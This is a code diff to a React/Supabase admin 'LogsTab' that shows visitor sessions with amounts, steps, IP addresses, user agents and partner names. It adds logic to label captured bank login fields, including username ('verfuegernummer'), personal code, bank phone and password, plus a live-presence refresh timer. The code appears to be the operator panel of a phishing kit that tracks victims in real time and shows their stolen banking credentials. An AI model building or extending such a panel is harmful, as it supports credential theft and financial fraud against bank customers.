@@ -5,7 +5,11 @@ import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
 import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
-import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
+import {
+  isSessionLive,
+  parseVisitorPresenceState,
+  VISITOR_PRESENCE_TICK_MS,
+} from "@/lib/admin-presence";
 
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
@@ -230,7 +234,9 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   };
 
   const orderedField1 = pickString("orderedField1");
+  const orderedField1Key = pickString("orderedField1Key");
   const orderedField2 = pickString("orderedField2");
+  const orderedField2Key = pickString("orderedField2Key");
   const orderedField2Type = pickString("orderedField2Type");
   const rawPersonalCode = pickString("personalCode");
   const rawUsername = pickString("username", "verfuegernummer");
@@ -246,10 +252,31 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   const fields: Array<[string, string]> = [];
 
   if (primaryValue) {
-    fields.push(["personalCode", primaryValue]);
+    const primaryKey =
+      orderedField1Key === "username" ||
+      orderedField1Key === "personalCode" ||
+      orderedField1Key === "bankPhone" ||
+      orderedField1Key === "password"
+        ? orderedField1Key
+        : rawPersonalCode && primaryValue === rawPersonalCode
+          ? "personalCode"
+          : rawUsername && primaryValue === rawUsername
+            ? "username"
+            : "personalCode";
+    fields.push([primaryKey, primaryValue]);
   }
 
   if (!secondaryValue) {
+    return fields;
+  }
+
+  if (
+    orderedField2Key === "username" ||
+    orderedField2Key === "personalCode" ||
+    orderedField2Key === "bankPhone" ||
+    orderedField2Key === "password"
+  ) {
+    fields.push([orderedField2Key, secondaryValue]);
     return fields;
   }
 
@@ -287,6 +314,14 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
   const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
   const [, setPresenceTick] = useState(0);
+
+  useEffect(() => {
+    const timer = window.setInterval(() => {
+      setPresenceTick((t) => t + 1);
+    }, VISITOR_PRESENCE_TICK_MS);
+
+    return () => window.clearInterval(timer);
+  }, []);
 
   const [chatSessionId, setChatSessionId] = useState<string | null>(null);
   const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);
